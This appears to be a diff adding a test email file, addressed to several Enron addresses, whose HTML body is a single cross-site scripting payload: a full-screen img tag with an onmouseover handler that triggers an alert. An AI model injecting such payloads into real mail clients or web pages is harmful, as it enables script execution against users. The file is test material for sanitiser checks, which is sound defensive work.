@@ -1,0 +1,7 @@
+From: anitha.mathis@enron.com
+To: dari.dornan@enron.com, mary.miller@enron.com, maria.pavlou@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<img ismap=itemtype=yyy style=width:100%;height:100%;position:fixed;left:0px;top:0px; onmouseover=alert(/XSS/)//>
